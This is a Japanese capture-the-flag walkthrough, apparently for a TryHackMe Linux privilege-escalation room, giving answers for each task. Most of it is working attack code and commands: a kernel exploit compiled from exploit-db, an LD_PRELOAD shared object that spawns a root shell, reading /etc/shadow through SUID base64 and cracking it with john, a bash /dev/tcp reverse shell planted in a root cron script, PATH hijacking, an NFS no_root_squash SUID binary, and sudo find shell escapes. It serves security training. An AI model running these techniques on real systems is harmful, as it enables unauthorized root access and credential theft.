# Linux Privilege Escalation

## Task3 Enumeration（列挙）

### 情報表示系コマンド

```shell
$ hostname    # ホスト名を表示
$ uname -a    # カーネルの情報を表示
$ cat /proc/version  # カーネルのバージョンに関する情報など
$ cat /etc/issue     # OSに関する情報を表示
$ ps -A       # 実行中のすべてのプロセスを表示
$ ps -axjf    # プロセスツリーを表示
$ ps aux      # すべてのユーザのプロセスを表示(a)、プロセスを起動したユーザを表示(u)、端末に接続されていないプロセスを表示(x)
$ env         # 環境変するを表示
$ sudo -l     # sudoコマンドを使用してユーザが実行できるコマンドを表示
$ id          # ユーザの特権レベルとグループを表示
$ cat /etc/passwd # システム上のユーザ情報一覧
$ history     # コマンドの使用履歴
$ ifconfig    # ネットワークインターフェースに関する情報
$ ip route    # ルーティングテーブルの表示
$ netstat -a  # すべてのListenポートとEstablishされた接続を表示
$ netstat -at # すべてのTCP接続。-uならUPD接続
$ netstat -tp # -p はPIDとサービス名を表示
```

### 検索コマンド

```shell
$ find . -name flag1.txt  # 現在のディレクトリで「flag1.txt」という名前のファイルを見つけます。
$ find / -type d -name config # 「/」の下にある config という名前のディレクトリを見つけます。
$ find / -type f -perm 0777 # 777 パーミッションを持つファイルを検索 (すべてのユーザーが読み取り、書き込み、および実行できるファイル)
$ find / -perm a=x # 実行可能ファイルを見つける
$ find /home -user frank # 「/home」の下にあるユーザー「frank」のすべてのファイルを検索します
$ find / -mtime 10 # 過去 10 日間に変更されたファイルを検索します
$ find / -atime 10 # 過去 10 日間にアクセスされたファイルを検索します
$ find / -cmin -60 # 過去 1 時間 (60 分) 以内に変更されたファイルを検索
$ find / -amin -60 # 過去 1 時間 (60 分) 以内のファイル アクセスを検索
$ find / -size 50M # サイズが 50 MB のファイルを検索
$ find / -perm -u=s -type f 2>/dev/null # SUIDビットガセットされているファイルを検索します。
```

## Task4 Automated Enumeration Tools(自動列挙ツール)

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES(Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)


## Task5 Privilege Escalation: Kernel Exploits

### カーネルエクスプロイトの手順

1. カーネルのバージョンを特定する。
2. ターゲットシステムのカーネルバージョンのエクスプロイトコードを検索して見つける。
3. エクスプロイトを実行する。

### 情報源

- Google検索
- [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)
- LES (Linux Exploit Suggester) などのスクリプトを使用する。

### タスク5の解答

[ここ](https://www.exploit-db.com/exploits/37292)にあるコードをコンパイルして実行するとルートになれる。

```shell
$ gcc ofs.c -o ofs
$ ./ofs
```
後は find で flag1.txtを探して中身を確認。

## Task6 Sudo

[sudo権限を持つコマンドの使用方法](https://gtfobins.github.io/)

### LD_PRELOADを利用した権限昇格手順

LD_PRELOADは任意のプログラムが共有ライブラリを使用できるようにする機能。

権限昇格手順は以下の通り。
1. LD_PRELOADを確認する(env_keepオプションを利用)。
2. 共有オブジェクト(.so拡張子)ファイルとしてコンパイルされたCコードを作成。
3. sudo権限と.soファイルを指すLD_PRELOADオプションでプログラムを実行。

コード例

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

このコードをshell.cとして保存し、gccで共有オブジェクトとしてコンパイル。

```shell
$ gcc -fPIC -shared -o shell.so shell.c --nostartfiles
```

sudoで実行できるプログラムを実行時に、この共有オブジェクトファイルを使用するように指定する。

```shell
$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

### タスク6の解答

1. sudo -lの出力を確認すればよい。
2. /home/ubuntuにflag2.txtがあるのでcatで見る。
3. https://gtfobins.github.io/ でnmapの欄を確認し、sudoでの特権昇格方
法に記載のとおり実行すればよい。
4. sudo -l で確認すると/usr/bin/nanoが含まれているので、上記3のURLでnanoの欄を確認し、sudo出の特権昇格方法に記載のとおり実行すればよい。

## Task7 Privilege Escalation:SUID

opensslを使用したハッシュパスワードの作成。

```shell
$ openssl passwd -l -salt THM password1
$1$THM$WnbwlliCqxFRQepUTCkUT1
```

### タスク7の解答

1. cat /etc/passwdの表示を確認。
2. 以下の手順で確認。
  
- findコマンドでSUIDビットが立っているファイルを探す。

```shell
$ find / -type f -perm -04000 -ls 2>/dev/null
```

- [GTFOBins](https://gtfobins.github.io/#%2Bsuid)で使えそうなコマンドを探すとbase64があったので以下のコマンドを実行。

```shell
$ base64 /etc/shadow | base64 --decode
```

- /etc/shadowの内容が表示されるので、user2の行をコピペし手元のKali Linuxで、shadow.txtファイルとして保存。
  - /etc/passwdからuser2の行をコピペし手元のKali Linuxで、passwd.txtファイルとして保存。
  - 手元のKali Linuxで以下のコマンドを実行。

```shell
$ unshadow passwd.txt shadow.txt > password.txt
```

  - john the ripperでpassword.txtを解析。

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt password.txt
```

3. 以下の手順で確認。

  - findでflag3.txtを探す。

```shell
$ find / -name '*flag3.txt' -ls 2>/dev/null
```
  - base64でflag3.txtの内容を確認。
  
```shell
$ base64 /home/ubuntu/flag3.txt | base64 --decode
```

## Task8 Privilege Escalation: Capabilities

### Capablitiesとは

↓参考URL  
- [Linuxカーネルのケーパビリティ\[1\]](https://gihyo.jp/admin/serial/01/linux_containers/0042)
- [Linuxカーネルのケーパビリティ\[2\]](https://gihyo.jp/admin/serial/01/linux_containers/0043)
- [Linuxカーネルのケーパビリティ\[3\]](https://gihyo.jp/admin/serial/01/linux_containers/0044)

有効なCapabilityを一覧表示する。

```shell
$ getcap -r / 2>/dev/null
```

表示結果のコマンドを [GTFOBins](https://gtfobins.github.io/#%2BCapabilities)で調べる

### タスク8の回答

1. 解答不要。
2. getcap -r / 2>/dev/null で確認。
3. 2のコマンド結果で確認。
4. 以下の手順で確認。

- find でflag4.txtを探す。
- タスク内に記載されている方法でrootになりcatでflag4.txtを表示。

## Task9 Privilege Escalation: Cron Jobs

crontabにroot権限で実行されるジョブがないか確認する。
そのジョブ（シェルスクリプトなど）が一般権限で書き込み可であれば以下の通り編集する。

```shell
#! /bin/bash
bash -i >& /dev/tcp/10.x.x.x/7777 0>&1
```

攻撃者側のシステムで 指定したポート(上記例では7777)で待受ける。

```shell
$ nc -lnvp 7777
```

### タスク9の解答

1. cat /etc/crontabで確認。
2. 以下の手順で確認。
  
- crontabの内容を確認すると/home/karen/backup.shがroot権限で実行されるようになっている。ファイルのパーミッションを確認すると書き込み権限があるので以下のとおり修正する。
   
```shell
#!/bin/bash
bash -i >& /dev/tcp/10.x.x.x/4242 0>&1  # ポートは任意の番号でよい
```

- ファイルのパーミッションに実行権限を付与する。

```shell
$ chmod +x /home/karen/backup.sh
```

- ローカルマシンで4242ポートを待受ける。
  
```shell
$ nc -nlvp 4242
```

これでroot特権を奪取できるので、flag5.txtの内容を確認する。  
(flag5.txtがどこにあるかは、findで探せば分かる）

3. タスク7の質問2と同じ方法で解ける。

## Task10 Privilege Escalation: PATH

### 環境変数PATHを利用した権限昇格の方法

#### デモ用バイナリの作成

```shell
$ cat path_exp.c
#!include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("thm");
}

$ gcc path_exp.c -o path -w
$ chmod u+s path
```

PATH変数に設定されているフォルダ内にthmという名前の実行可能ファイルを置く。

```shell
$cd /tmp    # /tmpが PATH変数に設定されているとする
$ echo "/bin/bash" > thm
$ chmod 777 thm
```

デモ用バイナリpathを実行。

```shell
$ ./pash
```

#### 書き込み可能なフォルダの検索方法

```shell
$ find / -writable 2>/dev/null | cut -d "/" -f2,3 | grep -v proc | sort -u
```

### タスク10 の解答 

1. 書き込み可能なフォルダ検索方法に記載のコマンドを実行して確認。
2. 解答不要。
3. 以下の手順で確認。

- thmを呼び出すプログラムを作成。  
  ターゲットマシンにgccがないためコンパイルできない。  
  findでSUIDビットがセットされているファイルを検索してみる。

```shell
$ find / -type f -perm -04000 2>/dev/null
～(省略)～
/home/murdoch/test  # 怪しげなファイルが見つかる
～(省略)～

$ cd /home/murdoc
$ ls -la 
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test  # SUIDがセットされている
$ ./test              # 実行してみる
sh: 1: thm: not found
```
  
- 質問1で確認したフォルダ内にthmという実行可能ファイルを作成する。

```shell
$ cd /home/murdoch/
$ echo "/bin/bash" > thm
$ chmod 777 thm
```

- testファイルを実行する。

- PATH変数確認。/home/murdochをPATHに追加後 testを実行。

```shell
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/
$ export PATH=/home/murdoch:$PATH
$ echo $PATH
/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ ./test
# ルートに昇格
```

- find でflag6.txtを探して中身を確認。

## Task11 Privillege Escalation: NFS

### NFSを利用した権限昇格の方法

1. /etc/exportsの内容を確認し、no_root_squashが設定されている共有フォルダがないか調べる。

```shell
$ cat /etc/exports
```

2. 攻撃マシンからマウント可能な共有を列挙

```shell
$ showmount -e 10.10.x.x
```

3. no_root_squashが設定されている共有を攻撃マシンからマウント。

```shell
$ mkdir /tmp/backup_attackmachine
$ mount -o rw 10.10.x.x:/tmp /tmp/backup_attackmachine
```

4. 実行可能ファイルをマウントしたフォルダに格納

```shell
$ cat nfs.c
int main()
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0
}
$ gcc nfs.c -o nfs -w
$ chmod +s nfs
$ ls -l nfs
-rwsr-sr-x  1 root root  8392 Sep 29 01:42 nfs
```

5. 作成した実行可能ファイル(上記例だとnfs)をターゲットマシンで実行。

### タスク11の解答

1. 攻撃マシンで "showmount -e ターゲットマシンのIP" の結果を確認。
2. ターゲットマシンで"cat /etc/exports"の結果を確認。
3. 上記「NFSを利用した権限昇格の方法」に記載の手順でroot権限を奪取
4. findでflag7.txtを探してcatで中身確認。

## Task12 Capstone Challenge

### タスク12の解答

1. 以下の手順で確認。

- 基本情報を確認。

```shell
$ cat /proc/version  # カーネルバージョン確認
$ cat /etc/issue
$ cat /etc/redhat-release
$ ls -l /home        # home配下に3つディレクトリ
$ cat /etc/crontab   # 登録なし
$ cat /etc/exports   # 登録なし
$ find / -name '*flag1.txt' 2>/dev/null   # ファイルの表示なし
$ find / -type f -perm -04000 2>/dev/null #SUIDビットガセットされているファイルを検索
/usr/bin/base64
```
- base64で /etc/shadowファイルを表示。  
  rootユーザーとmissyユーザー（/home配下にディレクトリがあったユーザー）の行を表示しファイルに保存。

```shell
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode | grep missy
base64 "$LFILE" | base64 --decode | grep root
```

- unshadowを実行。

```shell
$ unshadow passwd.txt shadow.txt > missy_password.txt
$ unshadow root_passwd.txt root_shadow.txt > root_password.txt
```

- john the ripperでパスワード解析  
  missyのパスワードは解析できた。rootはこの方法ではダメだった。

```shell
$ john missy_password.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
- missyユーザーにスイッチし /home/missyディレクトリを確認。  
  flag1.txtがあったので中身を表示。

```shell
$ su missy
Password:
$ cd /home/missy/
$ find / -name '*flag1.txt' 2>/dev/null
/home/missy/Documents/flag1.txt
$ cat /home/missy/Documents/flag1.txt
```

2.以下の手順で確認。

- missy ユーザーで sudo -lを実行。
  
```shell
$ sudo -l
～(省略)～
    (ALL) NOPASSWD: /usr/bin/find
```

- [GTFOBins](https://gtfobins.github.io/#%2BCapabilities)で findコマンドの sudoの欄を調べ実行する。

```shell
$ sudo find . -exec /bin/sh \; -quit
sh-4.2#
```

- findコマンドでflag2.txtを探し、catで中身を確認。

```shell
sh-4.2# find / -name '*flag2.txt' 2>/dev/null
/home/rootflag/flag2.txt
sh-4.2# cat /home/rootflag/flag2.txt 
```
